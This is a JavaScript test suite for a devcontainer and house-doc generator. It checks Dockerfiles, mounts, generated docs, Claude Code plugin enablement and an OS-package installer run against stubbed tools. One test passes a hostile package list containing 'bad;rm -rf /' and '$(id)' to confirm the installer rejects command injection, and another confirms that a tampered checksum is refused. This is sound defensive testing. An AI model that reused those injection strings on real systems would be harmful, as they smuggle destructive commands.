  ok(/^FROM mcr\.microsoft\.com\/devcontainers\/base:debian$/m.test(a.dockerfile), 'house.Dockerfile is not FROM the neutral base');
  ok(a.dc.remoteUser === 'vscode', `remoteUser ${a.dc.remoteUser}`);
  ok(a.dc.features['ghcr.io/devcontainers/features/node:1.7.1']?.version === '22', 'the Node feature, pinned to the node major');
  ok(JSON.stringify(a.dc.overrideFeatureInstallOrder) === '["ghcr.io/devcontainers/features/node"]', 'Node installs first');
  ok(a.dc.mounts.some((m) => m.includes('target=/home/vscode/.claude')), 'the .claude mount follows the image user');
  ok(a.dc.mounts.some((m) => m.endsWith('/.nx/cache,type=volume')) && !a.dc.mounts.some((m) => m.endsWith('/.nx,type=volume')), 'Nx state on exact volumes, never over .nx/ (it holds the committed nxw.js)');
  ok(!a.dcText.includes('/home/node'), '/home/node hard-coded');
  ok(!/node_modules|CHOKIDAR|eslint|prettier|\.nx,type=volume|4200|tigervnc|runArgs|forwardPorts/.test(a.dcText), 'a Node/web/Angular artifact leaked into the devcontainer');
  ok(a.dcText.startsWith('// BeSpunky-standard devcontainer.'), 'the ownership fingerprint (first line) is kept');
  ok(bashParses(a.post), 'post-create.sh does not parse');
  ok(!/tigervnc|playwright install|PM_INSTALL|default-jdk|angular\/skills/.test(a.post + a.osScript), 'post-create or the package list carries a step for a layer this repo does not have');
  ok(a.post.includes('.nx/nxw.js') && /^tmux$/m.test(a.osScript) && /^curl$/m.test(a.osScript), 'the wrapper install + the agent OS packages');
  // No layer here declares an archive tool: no empty HOUSE_ARCHIVES list, no installer looping over nothing.
  ok(!/HOUSE_ARCHIVES|install_archive|archive tools? to install|\{\{/.test(a.osScript) && shParses(a.osScript), 'the archive machinery (or a placeholder) rendered with no archive tool to install');
  ok(a.post.includes('sh .devcontainer/house.packages.sh .devcontainer/os-packages.txt'), 'post-create does not run the one package installer');
  ok(a.post.includes('Generated by @bespunky/nx-tools:devcontainer'), 'post-create provenance line');
  const enabled = Object.keys(a.settings.enabledPlugins);
  ok(enabled.includes('nx@nx-claude-plugins') && enabled.includes('bespunky-communication@claude-toolkit'), `enabled ${enabled}`);
  ok(!enabled.some((p) => /angular|design-system|browser-automation/.test(p)), `stack plugins enabled without their layer: ${enabled}`);
  for (const plugin of enabled.filter((p) => p.endsWith('@claude-toolkit') || p.startsWith('nx@'))) {
    ok(a.post.includes(plugin), `${plugin} enabled in settings but not pre-installed`);
  }
  ok(a.gitignore.includes('.nx/cache') && a.gitignore.includes('.claude/data/'), 'gitignore blocks of nx + agent');
  ok(a.house.includes('`./nx`') && a.house.includes('./nx affected -t <target>'), 'HOUSE.md renders the wrapper invocation');
  ok(!/yarn|npm nx|npx nx|4200|Angular|typescript-node|Package manager/.test(a.house), `HOUSE.md names a package manager, Angular or 4200 in a Python repo: ${a.house.split('\n').filter((l) => /yarn|npm nx|npx nx|4200|Angular|typescript-node|Package manager/.test(l)).map((l) => l.slice(0, 160)).join(' || ')}`);
  ok(!/4200|::ng-deep|yarn|npm nx/.test(a.rules), 'HOUSE.rules.md names 4200, ::ng-deep or a package manager');
  ok(a.rules.includes('`./nx`'), 'Generator-first names the wrapper invocation');
  ok(!/prefix|apps\/|SCSS/.test(a.claude), 'the CLAUDE.md seed carries Angular/monorepo conventions');
});

checkAsync('python repo serving a hand-written dev.json (web, no Nx app): HOUSE.md serves through tools/dev/dev, never nx serve/Angular/4200', async (ok) => {
  const tree = FIXTURES['python repo with a hand-written dev declaration']();
  writeJson(tree, 'nx.json', { installation: { version: '23.2.1', plugins: { '@bespunky/nx-tools': '9.9.9' } } });
  tree.write('.nx/nxw.js', '// wrapper\n');
  const a = await artifacts(tree, registry.detectLayers(tree));
  ok(a.house.includes('`tools/dev/dev serve <app>` is the one command') && a.house.includes('tools/dev/dev serve <app> --worktree='), 'the engine is the serve command');
  const wrong = a.house.split('\n').filter((l) => /nx serve|4200|@angular|Angular|--configuration|NX_WORKSPACE_ROOT_PATH|\{\{/.test(l));
  ok(wrong.length === 0, `HOUSE.md describes a serve this repo does not have: ${wrong.map((l) => l.slice(0, 140)).join(' || ')}`);
});

checkAsync('an Nx app wired to the house serve executor: HOUSE.md serves through `<pm> nx serve`', async (ok) => {
  const tree = FIXTURES['angular web app with firebase and a design system']();
  tree.write('yarn.lock', '');
  const shop = readProjectConfiguration(tree, 'shop');
  shop.targets.serve = { executor: '@bespunky/nx-tools:serve' };
  updateProjectConfiguration(tree, 'shop', shop);
  const a = await artifacts(tree, registry.detectLayers(tree));
  ok(a.house.includes('`yarn nx serve <app>` is the one command') && a.house.includes('http://localhost:4200'), 'nx serve + the Angular base port');
  ok(a.house.includes('yarn nx serve <app> --no-emulators'), 'the Nx face keeps --no-emulators');
  // A SECOND stack of the same app in the same tree is just a second serve: every `nx serve` is its own stack.
  ok(a.house.includes('### Running stacks') && a.house.includes('just serve it again — `yarn nx serve <app>` claims the next free block'), 'a second stack is the Nx face again');
  ok(!a.house.includes('tools/dev/dev serve <app> --'), 'engine serve commands never rendered where the Nx face exists');
  ok(/, and\n- the \*\*shared co-driven browser/.test(a.house), 'the serve list is one list (no blank line left by a removed block)');
});

checkAsync('a build-bringing layer on an nx-init repo (firebase, no create-nx-workspace .gitignore): dist is ignored, once', async (ok) => {
  const tree = FIXTURES['plain npm repo wearing firebase and a neutral design system']();
  tree.write('.gitignore', 'node_modules\n');
  await artifacts(tree, [...registry.detectLayers(tree), 'agent']);
  await generator('gitignore')(tree, { layers: [...registry.detectLayers(tree), 'agent'] });
  const lines = (tree.read('.gitignore', 'utf8') ?? '').split('\n');
  ok(lines.filter((l) => l === 'dist').length === 1, `dist ignored exactly once: ${JSON.stringify(lines)}`);
  // A create-nx-workspace .gitignore already says `dist` — a house workspace must not gain a second entry.
  const cnw = FIXTURES['plain npm repo wearing firebase and a neutral design system']();
  cnw.write('.gitignore', '# compiled output\ndist\ntmp\n');
  await generator('gitignore')(cnw, { layers: [...registry.detectLayers(cnw), 'agent'] });
  ok(!(cnw.read('.gitignore', 'utf8') ?? '').includes('Build output'), 'a create-nx-workspace .gitignore gained a duplicate dist block');
});

checkAsync('firebase core without Angular (no served app): HOUSE.md documents the core, not the Angular client', async (ok) => {
  const tree = FIXTURES['plain npm repo wearing firebase and a neutral design system']();
  const a = await artifacts(tree, [...registry.detectLayers(tree), 'agent']);
  ok(a.house.includes('## Firebase') && a.house.includes('run firebase:emulators') && a.house.includes('### Cloud Functions'), 'the Firebase core is documented');
  const wrong = a.house.split('\n').filter((l) => /environment\.ts|environment\.prod\.ts|provideApp|proxy\.conf|app\.config\.ts|@angular\/(fire|build)|4200|tools\/dev\/dev serve|nx serve|\{\{/.test(l));
  ok(wrong.length === 0, `Angular-client / dev-loop docs in a core-only Firebase project: ${wrong.map((l) => l.slice(0, 120)).join(' || ')}`);
});

checkAsync('npm package.json repo, nx+agent+node: typescript-node, npx nx, no web floor', async (ok) => {
  const tree = createTreeWithEmptyWorkspace();
  tree.write('package-lock.json', '{}');
  const a = await artifacts(tree, ['nx', 'agent', 'node']);
  ok(/^FROM mcr\.microsoft\.com\/devcontainers\/typescript-node:22$/m.test(a.dockerfile) && a.dc.remoteUser === 'node', 'house.Dockerfile is not FROM typescript-node:22 (or remoteUser lost)');
  ok(!a.dc.features['ghcr.io/devcontainers/features/node:1.7.1'] && !a.dc.overrideFeatureInstallOrder, 'no Node feature on a Node image');
  ok(a.dc.mounts.some((m) => m.includes('node_modules,type=volume')) && a.dc.remoteEnv.CHOKIDAR_USEPOLLING === 'true', 'node artifacts');
  ok(
    a.dc.remoteEnv.PATH === '/home/node/.local/bin:${containerWorkspaceFolder}/node_modules/.bin:${containerEnv:PATH}',
    `PATH composed from agent + node, native Claude Code first: ${a.dc.remoteEnv.PATH}`,
  );
  ok(!/tigervnc|4200|runArgs/.test(a.dcText + a.post + a.osScript), 'web/Angular artifacts leaked');
  ok(bashParses(a.post) && a.post.includes('$PM_INSTALL'), 'post-create installs through the package manager');
  ok(a.house.includes('npx nx build <project>') && !a.house.includes('npm nx'), 'HOUSE.md renders `npx nx`, never `npm nx`');
  ok(a.house.includes('**Package manager**: npm'), 'the package manager is named');
});

// A generated doc that names `bespunky-<plugin>:<skill-or-agent>` is an instruction to use it — and a project's own
// layers are what enable a plugin (`claudePlugins` → .claude/settings.json). So every such reference must name a plugin
// the layer set enables, or the doc tells Claude to call a skill or an agent that may not exist there (a floor-only
// project was told to dispatch `bespunky-workflow:sanity-reviewer`). Checked for EVERY layer set a project can hold —
// each subset of the registry closed under `requires` — with the branch model declared and undeclared, because the
// gates nest inside layer and model gates (`{{#ci}}{{#firebase}}`, `{{#branches-declared}}`) a smaller sample misses.
const WORKFLOW_ONLY = [/\bbranches\.mjs\b/, /\bthe skill(?:'s)?\b/];
const NX_ONLY = [/`nx-[a-z-]+` skill/, /\bNx MCP\b/];
checkAsync('house docs name only toolkit skills and agents whose plugin the project enables', async (ok) => {
  const { claudePlugins } = require_(join(BUILD, 'src/generators/_utils/layer-contributions'));
  const { enabledPlugins } = require_(join(BUILD, 'src/generators/_utils/claude-settings-file'));
  const ids = registry.LAYERS.map((l) => l.id);
  const sets = [];
  for (let mask = 1; mask < 1 << ids.length; mask++) {
    const set = ids.filter((_, i) => mask & (1 << i));
    if (set.includes('nx') && set.every((id) => registry.layer(id).requires.every((r) => set.includes(r)))) sets.push(set);
  }
  const declared = { schema: 1, integration: 'main', production: ['main'], productionPatterns: [], chain: ['main'], protected: ['main'], protectedPatterns: [], workBase: 'main', summary: 'main (trunk)' };
  // What a plugin's presence turns on is ENABLEMENT, which only `.claude/settings.json` records — written by the agent
  // layer's `claude-settings` step (run here exactly where the planner runs it: before house-doc), or by the project
  // itself (the last case: no agent layer, bespunky-workflow enabled by hand, so its directives must render).
  const handEnabled = { enabledPlugins: { 'bespunky-workflow@claude-toolkit': true } };
  for (const [layers, settings] of [...sets.map((set) => [set, undefined]), [['nx'], handEnabled]]) {
    for (const model of ['undeclared', JSON.stringify(declared)]) {
      const key = `${layers.join(',')}${settings ? ' + hand-enabled workflow' : ''} (${model === 'undeclared' ? 'undeclared' : 'declared'})`;
      const tree = createTreeWithEmptyWorkspace();
      if (settings) tree.write('.claude/settings.json', JSON.stringify(settings));
      if (layers.includes('agent')) await generator('claude-settings')(tree, { layers });
      const enabled = enabledPlugins(tree);
      await generator('house-doc')(tree, { layers, firebase: layers.includes('firebase'), nxToolsVersion: '9.9.9', pluginVersion: '1.0.0', branchProjection: model });
      const rules = tree.read('HOUSE.rules.md', 'utf8') ?? '';
      for (const file of ['HOUSE.md', 'HOUSE.rules.md', 'CLAUDE.md']) {
        const text = tree.read(file, 'utf8') ?? '';
        const named = new Set(text.match(/bespunky-[a-z0-9-]+(?=:[a-z])/g) ?? []);
        for (const plugin of named) ok(enabled.has(plugin), `${key}: ${file} names ${plugin}, which this project does not enable`);
        // Unnamed references to the workflow skill and its engine — `branches.mjs` ships inside bespunky-workflow.
        if (!enabled.has('bespunky-workflow')) for (const re of WORKFLOW_ONLY) ok(!re.test(text), `${key}: ${file} still says ${text.match(re)?.[0]} without bespunky-workflow`);
        // The Nx plugin's skills and MCP server carry no `bespunky-` namespace, so they are named here.
        if (!enabled.has('nx')) for (const re of NX_ONLY) ok(!re.test(text), `${key}: ${file} still says ${text.match(re)?.[0]} without the Nx plugin`);
      }
      // And the other direction: where the plugin IS enabled, its directives render — gating must never drop them.
      if (enabled.has('bespunky-workflow')) ok(rules.includes('## Review before you hand back (non-negotiable)') && rules.includes('## Branch & release workflow'), `${key}: bespunky-workflow is enabled, but its directives did not render`);
      // The pointer block promises the directives HOUSE.rules.md carries — never one that did not render.
      const pointer = tree.read('CLAUDE.md', 'utf8') ?? '';
      for (const [named, heading] of [['architecture-first', '## Architecture-first'], ['branch & release rules', '## Branch & release'], ['a feature is a package', '## A feature is a package'], ['design-system-first', '## Design-system-first'], ['redesign-means-rethink', '## Redesign means rethink']]) {
        ok(!pointer.includes(named) || rules.includes(heading), `${key}: the CLAUDE.md pointer promises ${named}, which HOUSE.rules.md does not carry`);
      }
    }
  }
  // A misspelled gate renders false everywhere, silently — so every `plugin-<name>` a template gates on must be a plugin
  // some layer declares.
  const declaredAnywhere = new Set(claudePlugins(registry.LAYERS).plugins.map((id) => `plugin-${id.split('@')[0]}`));
  const dir = join(PAYLOAD, 'src/generators/house-doc');
  for (const file of readdirSync(dir).filter((f) => f.endsWith('.tpl'))) {
    for (const [, flag] of readFileSync(join(dir, file), 'utf8').matchAll(/\{\{[#^/](plugin-[\w-]+)\}\}/g)) ok(declaredAnywhere.has(flag), `${file} gates on ${flag}, which no layer declares`);
  }
  // Every OTHER template reaches a toolkit skill or command only through a pointer token (_utils/plugin-pointers): a
  // name typed into the template itself renders whatever the project enables. And each pointer table entry gates on the
  // plugin its own text names — a mismatch (a typo, a renamed plugin) would gate on one and point at another.
  const templates = (root) =>
    readdirSync(root, { withFileTypes: true, recursive: true })
      .filter((e) => e.isFile() && e.name.endsWith('.tpl'))
      .map((e) => join(e.parentPath ?? e.path, e.name));
  for (const file of templates(join(PAYLOAD, 'src')).filter((f) => !f.startsWith(dir))) {
    const hit = readFileSync(file, 'utf8').match(/\/?bespunky-[a-z0-9-]+:[a-z]/);
    ok(!hit, `${file.slice(PAYLOAD.length + 1)} names ${hit?.[0]} directly — route it through a plugin-pointers token`);
  }
  for (const table of ['design-system/skill-pointers', 'firebase-emulators/skill-pointers', 'ci/skill-pointers']) {
    for (const [name, pointers] of Object.entries(require_(join(BUILD, 'src/generators', table)))) {
      for (const [token, [plugin, text]] of Object.entries(pointers)) {
        ok(text.includes(`${plugin}:`) && declaredAnywhere.has(`plugin-${plugin}`), `${table} ${name}.${token} gates on ${plugin} but its text points elsewhere, or no layer declares it`);
      }
    }
  }
});

checkAsync('HOUSE.rules.md: the stack-agnostic directives render in a repo with NO ui layer (none hides inside a layer gate)', async (ok) => {
  const a = await artifacts(createTreeWithEmptyWorkspace(), ['nx', 'agent']);
  for (const heading of ['## Architect mentality', '## Architecture-first (non-negotiable)', '## Finish the whole job — verified where it runs (non-negotiable)', '## Review before you hand back (non-negotiable)', '## A feature is a package (non-negotiable)', '## Delegate and parallelize (non-negotiable)']) {
    ok(a.rules.includes(heading), `missing from a no-UI repo's HOUSE.rules.md: ${heading}`);
  }
  ok(!a.rules.includes('## Redesign means rethink'), 'the ui-gated directive leaked into a repo with no ui layer');
});

checkAsync('agent: Claude Code installed ONCE, natively, before the plugin pre-install — no shadowing feature', async (ok) => {
  const a = await artifacts(createTreeWithEmptyWorkspace(), ['nx', 'agent']);
  ok(!Object.keys(a.dc.features).some((id) => id.includes('claude-code')), `a claude-code feature is back: ${Object.keys(a.dc.features)}`);
  ok(a.dc.remoteEnv.PATH === '/home/vscode/.local/bin:${containerEnv:PATH}', `PATH: ${a.dc.remoteEnv.PATH}`);
  const install = a.post.indexOf('claude.ai/install.sh');
  ok(install !== -1 && install > a.post.indexOf('sh .devcontainer/house.packages.sh') && install < a.post.indexOf('claude plugin install'), 'native install runs after the OS packages, before the plugins');
  ok(bashParses(a.post), 'post-create parses');
});

checkAsync('full house shape (angular+firebase+design system, web): the 0.34 container, bespunky-angular enabled', async (ok) => {
  const tree = FIXTURES['angular web app with firebase and a design system']();
  tree.write('yarn.lock', '');
  const layers = registry.detectLayers(tree);
  const a = await artifacts(tree, layers);
  ok(/^FROM mcr\.microsoft\.com\/devcontainers\/typescript-node:22$/m.test(a.dockerfile), 'house.Dockerfile is not FROM typescript-node:22');
  ok(JSON.stringify(a.dc.forwardPorts) === '[80,4200,4000,9099,8080,9150,9199,5001,4500]', `forwardPorts ${JSON.stringify(a.dc.forwardPorts)}`);
  ok(a.dc.portsAttributes['4200'].label === 'Angular Dev Server', '4200 label');
  ok(a.dc.portsAttributes['6080'].requireLocalPort === true && a.dc.portsAttributes['6119'], 'the noVNC band');
  for (const ext of ['nrwl.angular-console', 'Angular.ng-template', 'toba.vsfire', 'dbaeumer.vscode-eslint', 'formulahendry.auto-rename-tag']) {
    ok(a.dc.customizations.vscode.extensions.includes(ext), `extension ${ext}`);
  }
  ok(a.dc.runArgs.includes('--sysctl') && a.dc.containerEnv.BESPUNKY_DEVCONTAINER_ID, 'web run args + container env');
  ok(a.dc.mounts.length === 9, `mounts ${a.dc.mounts.length}`);
  ok(bashParses(a.post), 'post-create.sh does not parse');
  for (const name of ['tigervnc-standalone-server', 'default-jdk-headless']) ok(new RegExp(`(^| )${name}( |$)`, 'm').test(a.osScript), `the package list lacks ${name}`);
  ok(!a.post.includes('--with-deps'), 'post-create still apt-installs Chromium\'s libraries (--with-deps) — they are image packages');
  for (const piece of ['angular/skills', 'playwright install chromium', 'zz-firebase-welcome', '/var/opt/bespunky/ports']) {
    ok(a.post.includes(piece), `post-create lacks ${piece}`);
  }
  const enabled = Object.keys(a.settings.enabledPlugins);
  for (const plugin of ['bespunky-angular@claude-toolkit', 'bespunky-design-system@claude-toolkit', 'bespunky-browser-automation@claude-toolkit']) {
    ok(enabled.includes(plugin) && a.post.includes(plugin), `${plugin} enabled + pre-installed`);
  }
  ok(a.house.includes('yarn nx g @bespunky/nx-tools:app') && a.rules.includes('`4200`') && a.rules.includes('::ng-deep'), 'Angular docs render');
  ok(a.claude.includes('prefix') && a.claude.includes('apps/'), 'the CLAUDE.md seed carries the Angular conventions');
});

checkAsync('voice intent: host probe + bridge composed in; a second run changes nothing', async (ok) => {
  const tree = wrapperRepo();
  const first = await artifacts(tree, ['nx', 'agent'], { voice: true });
  ok(first.dc.initializeCommand?.['bespunky-host-probe'] === 'sh .devcontainer/host-probe.sh', 'probe');
  ok(first.dc.remoteEnv.PULSE_SERVER && tree.exists('.devcontainer/host-probe.sh'), 'bridge');
  ok(bashParses(first.post) && first.post.includes('bespunky-voice@claude-toolkit') && !first.post.includes('apt-get'), 'voice step (the plugin only — no apt of its own)');
  ok(/^pulseaudio-utils espeak-ng$/m.test(first.osScript), 'voice packages are not in the composed package list');
  const second = await artifacts(tree, ['nx', 'agent'], { voice: true });
  ok(second.dcText === first.dcText && second.post === first.post, 'not idempotent');
  ok(JSON.parse(tree.read('.devcontainer/.bespunky-devcontainer.json', 'utf8')).voice === true, 'the marker carries voice forward');
});

// A gitignored bind source (`.claude/data`) is absent from every fresh clone, and Docker refuses a bind mount
// whose source is missing — the container does not start. The probe, run on the host before every open, is
// what makes each one exist; this runs the RENDERED probe against an on-disk "fresh clone" of the output.
checkAsync('every house devcontainer runs the host probe, and the probe makes each workspace bind source exist', async (ok) => {
  const sources = (dc) => dc.mounts.flatMap((m) => (/type=bind/.test(m) ? [/source=\$\{localWorkspaceFolder\}\/([^,]+)/.exec(m)?.[1]].filter(Boolean) : []));
  const freshClone = (tree, dc) => {
    const dir = mkdtempSync(join(tmpdir(), 'probe-clone-'));
    mkdirSync(join(dir, '.devcontainer'));
    writeFileSync(join(dir, '.devcontainer/host-probe.sh'), tree.read('.devcontainer/host-probe.sh', 'utf8'));
    const run = () => execFileSync('sh', ['.devcontainer/host-probe.sh'], { cwd: dir, env: { PATH: process.env.PATH, HOME: dir }, encoding: 'utf8' });
    run();
    const missing = sources(dc).filter((s) => !existsSync(join(dir, s)));
    writeFileSync(join(dir, '.claude/data/kept'), 'state');
    run(); // a second open never touches an existing source
    const kept = readFileSync(join(dir, '.claude/data/kept'), 'utf8') === 'state';
    rmSync(dir, { recursive: true, force: true });
    return { missing, kept };
  };
  for (const [label, voice] of [['no voice', false], ['voice', true]]) {
    const tree = wrapperRepo();
    const a = await artifacts(tree, ['nx', 'agent'], { voice });
    ok(a.dc.initializeCommand?.['bespunky-host-probe'] === 'sh .devcontainer/host-probe.sh', `${label}: the probe is the initializeCommand`);
    ok(sources(a.dc).includes('.claude/data'), `${label}: .claude/data is a bind source`);
    const { missing, kept } = freshClone(tree, a.dc);
    ok(missing.length === 0, `${label}: the probe left bind sources missing on a fresh clone: ${missing}`);
    ok(kept, `${label}: a second open clobbered an existing source`);
    ok(!tree.exists('.claude/data/.gitkeep'), `${label}: a gitignored .gitkeep is not the mechanism (absent on every clone)`);
    ok(a.gitignore.includes('.devcontainer/.host/') === voice, `${label}: the audio state dir is ignored exactly when there is audio state`);
  }
  // Adopted: a project's own STRING initializeCommand is kept, lifted beside the probe.
  const tree = wrapperRepo();
  tree.write('.devcontainer/devcontainer.json', '{\n  "image": "python:3.12",\n  "initializeCommand": "echo theirs"\n}\n');
  const a = await artifacts(tree, ['nx', 'agent']);
  ok(a.dc.initializeCommand?.project === 'echo theirs' && a.dc.initializeCommand['bespunky-host-probe'], `adopted: theirs kept beside the probe: ${JSON.stringify(a.dc.initializeCommand)}`);
  ok(freshClone(tree, a.dc).missing.length === 0, 'adopted: bind sources exist after the probe');
});

// The image is BUILT from the house Dockerfile so the OS packages are one cached layer; ONE installer serves the image
// build and post-create alike (installs only what is missing). Run against stubbed dpkg/apt so the behaviour, not the
// text, is what is checked.
const runInstaller = (script, { present = [], aptFails = false, projectList } = {}) => {
  const dir = mkdtempSync(join(tmpdir(), 'os-packages-'));
  const bin = join(dir, 'bin');
  mkdirSync(bin);
  const log = join(dir, 'apt.log');
  writeFileSync(join(dir, 'house.packages.sh'), script);
  if (projectList !== undefined) writeFileSync(join(dir, 'os-packages.txt'), projectList);
  writeFileSync(join(bin, 'dpkg-query'), `#!/bin/sh\nfor last; do :; done\nfor p in ${present.join(' ')}; do [ "$p" = "$last" ] && { printf 'install ok installed'; exit 0; }; done\nexit 1\n`, { mode: 0o755 });
  writeFileSync(join(bin, 'apt-get'), `#!/bin/sh\necho "$*" >> '${log}'\n${aptFails ? 'exit 100' : 'exit 0'}\n`, { mode: 0o755 });
  writeFileSync(join(bin, 'sudo'), '#!/bin/sh\nexec "$@"\n', { mode: 0o755 });
  writeFileSync(join(bin, 'sleep'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  let status = 0;
  let output = '';
  try {
    output = execFileSync('sh', ['-c', 'sh "$0" "$1" 2>&1', join(dir, 'house.packages.sh'), join(dir, 'os-packages.txt')], { env: { PATH: `${bin}:${process.env.PATH}` }, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (error) {
    status = error.status;
    output = `${error.stdout}${error.stderr}`;
  }
  const calls = existsSync(log) ? readFileSync(log, 'utf8').trim().split('\n') : [];
  rmSync(dir, { recursive: true, force: true });
  return { status, calls, installs: calls.filter((c) => c.startsWith('install')), output };
};

const readlinkSafe = (path) => { try { return readlinkSync(path); } catch { return null; } };
const lexists = (path) => { try { lstatSync(path); return true; } catch { return false; } };

checkAsync('image: built from house.Dockerfile — one cached package layer; the installer installs only what is missing', async (ok) => {
  const a = await artifacts(wrapperRepo(), ['nx', 'agent'], { voice: true });
  ok(/^COPY house\.packages\.sh os-packages\.tx\[t\] /m.test(a.dockerfile) && /RUN sh \/tmp\/bespunky-os-packages\/house\.packages\.sh \/tmp\/bespunky-os-packages\/os-packages\.txt/.test(a.dockerfile), 'the Dockerfile does not install both lists through the one installer');
  ok(!/claude\.ai\/install|claude-code/.test(a.dockerfile), 'Claude Code baked into the image (a cached layer would freeze its version)');
  ok(a.osList.startsWith('# This project') && shParses(a.osScript), 'the project list is seeded; the installer parses under sh -n');

  const everything = runInstaller(a.osScript, { projectList: '# ours\npostgresql-client\n' });
  ok(everything.status === 0 && everything.installs.length === 1, `nothing present: ONE install transaction, got ${JSON.stringify(everything.calls)}`);
  const wanted = everything.installs[0] ?? '';
  for (const name of ['tmux', 'curl', 'pulseaudio-utils', 'espeak-ng', 'postgresql-client']) ok(wanted.split(' ').includes(name), `the install lacks ${name}`);

  const present = ['tmux', 'curl', 'pulseaudio-utils', 'espeak-ng', 'postgresql-client'];
  const none = runInstaller(a.osScript, { present, projectList: 'postgresql-client\n' });
  ok(none.status === 0 && none.calls.length === 0, `all present (a house-built image): apt was still called: ${JSON.stringify(none.calls)}`);

  const some = runInstaller(a.osScript, { present: ['tmux', 'curl'], projectList: 'sox sox   # twice, one line\n' });
  ok(some.installs.length === 1 && some.installs[0].trim() === 'install -y pulseaudio-utils espeak-ng sox', `only the missing, de-duplicated: ${JSON.stringify(some.installs)}`);

  const hostile = runInstaller(a.osScript, { present, projectList: 'bad;rm -rf /\n$(id)\nUpper\n' });
  ok(hostile.calls.length === 0 && /not a Debian package name/.test(hostile.output), `a non-package token reached apt: ${JSON.stringify(hostile.calls)}`);

  const failing = runInstaller(a.osScript, { aptFails: true, projectList: '' });
  ok(failing.status !== 0 && failing.calls.filter((c) => c === 'update').length === 3, `a failing install must retry 3x then exit non-zero (status ${failing.status}, ${JSON.stringify(failing.calls)})`);
});

// An ARCHIVE TOOL (a fragment's `archives`): the same one installer, run against a re-rooted filesystem
// (HOUSE_PACKAGES_ROOT) with curl and uname stubbed — install, no-op when current, a moved pin switching cleanly
// (old release and its dangling links gone), a bad checksum refused, a foreign file never clobbered.
checkAsync('image: an archive tool installs at its pin, is a no-op when current, and a moved pin switches cleanly', async (ok) => {
  const { createHash } = await import('node:crypto');
  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const dir = mkdtempSync(join(tmpdir(), 'archive-tool-'));
  const bin = join(dir, 'bin');
  const root = join(dir, 'root');
  mkdirSync(bin);
  mkdirSync(join(root, 'usr/local/bin'), { recursive: true });
  const tarball = (version, tools) => {
    const src = join(dir, `src-${version}`);
    mkdirSync(join(src, 'tool/bin'), { recursive: true });
    for (const name of tools) writeFileSync(join(src, 'tool/bin', name), `#!/bin/sh\necho ${name} ${version}\n`, { mode: 0o755 });
    const file = join(dir, `tool-${version}.tar.gz`);
    execFileSync('tar', ['-czf', file, '-C', src, 'tool']);
    return { file, sha256: createHash('sha256').update(readFileSync(file)).digest('hex') };
  };
  const v1 = tarball('1.0.0', ['hello', 'only-v1']);
  const v2 = tarball('2.0.0', ['hello']);
  const log = join(dir, 'curl.log');
  // curl: "download" https://archives.test/<file> from the local dir.
  writeFileSync(join(bin, 'curl'), `#!/bin/sh\nfor a; do case "$a" in https://*) url="$a" ;; esac; done\nwhile [ $# -gt 0 ]; do [ "$1" = -o ] && out="$2"; shift; done\necho "$url" >> '${log}'\ncp '${dir}'/"\${url##*/}" "$out"\n`, { mode: 0o755 });
  writeFileSync(join(bin, 'uname'), '#!/bin/sh\necho x86_64\n', { mode: 0o755 });
  writeFileSync(join(bin, 'dpkg-query'), "#!/bin/sh\nprintf 'install ok installed'\n", { mode: 0o755 });
  writeFileSync(join(bin, 'sudo'), '#!/bin/sh\nexec "$@"\n', { mode: 0o755 });
  const script = (version, { sha256 }, arch = 'amd64') =>
    renderOsPackagesScript(compose([{ id: 'x', fragment: { image: { ref: 'img', remoteUser: 'node' }, archives: [{ id: 'tool', version, bin: 'tool/bin', downloads: { [arch]: { url: `https://archives.test/tool-${version}.tar.gz`, sha256 } } }] } }], { nodeMajor: '22' }));
  const runIt = (text) => {
    writeFileSync(join(dir, 'house.packages.sh'), text);
    rmSync(log, { force: true });
    try {
      const output = execFileSync('sh', ['-c', 'sh "$0" 2>&1', join(dir, 'house.packages.sh')], { env: { PATH: `${bin}:${process.env.PATH}`, HOUSE_PACKAGES_ROOT: root }, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
      return { status: 0, output, fetched: existsSync(log) ? readFileSync(log, 'utf8').trim().split('\n') : [] };
    } catch (error) {
      return { status: error.status, output: `${error.stdout}${error.stderr}`, fetched: existsSync(log) ? readFileSync(log, 'utf8').trim().split('\n') : [] };
    }
  };
  const home = join(root, 'opt/bespunky/tool');
  const links = join(root, 'usr/local/bin');
  const say = (name) => execFileSync(join(links, name), { encoding: 'utf8' }).trim();
  try {
    ok(script('1.0.0', v1).includes('curl ca-certificates'), 'an archive tool did not bring its fetch tools (curl, ca-certificates) into the package list');
    const first = runIt(script('1.0.0', v1));
    ok(first.status === 0 && first.fetched.length === 1, `fresh install: ${JSON.stringify(first)}`);
    ok(readlinkSafe(join(home, 'current')) === '1.0.0' && say('hello') === 'hello 1.0.0' && say('only-v1') === 'only-v1 1.0.0', 'the pinned release is not current, or its executables are not linked');
    const again = runIt(script('1.0.0', v1));
    ok(again.status === 0 && again.fetched.length === 0 && /all present/.test(again.output), `at the pin, the installer still fetched: ${JSON.stringify(again)}`);
    const moved = runIt(script('2.0.0', v2));
    ok(moved.status === 0 && moved.fetched.length === 1 && readlinkSafe(join(home, 'current')) === '2.0.0' && say('hello') === 'hello 2.0.0', `a moved pin did not switch: ${JSON.stringify(moved)}`);
    ok(!existsSync(join(home, '1.0.0')) && !lexists(join(links, 'only-v1')), 'a moved pin left the old release or its dangling link behind');
    const back = runIt(script('1.0.0', v1));
    ok(back.status === 0 && readlinkSafe(join(home, 'current')) === '1.0.0' && say('hello') === 'hello 1.0.0', 'moving the pin BACK did not switch (no downgrade dance should be needed)');
    const tampered = runIt(script('2.0.0', { sha256: 'f'.repeat(64) }));
    ok(tampered.status !== 0 && /does not match its pinned sha256/.test(tampered.output) && readlinkSafe(join(home, 'current')) === '1.0.0', `a checksum mismatch was installed (or switched current): ${JSON.stringify(tampered)}`);
    rmSync(join(links, 'hello'));
    writeFileSync(join(links, 'hello'), 'theirs\n');
    const foreign = runIt(script('2.0.0', v2));
    ok(foreign.status === 0 && readFileSync(join(links, 'hello'), 'utf8') === 'theirs\n' && /not tool's — left alone/.test(foreign.output), `a file the installer did not make was clobbered: ${JSON.stringify(foreign)}`);
    const otherArch = runIt(script('3.0.0', v2, 'arm64'));
    ok(otherArch.status !== 0 && /no archive for this architecture \(amd64\)/.test(otherArch.output), `an archive missing for this architecture did not fail loudly: ${JSON.stringify(otherArch)}`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

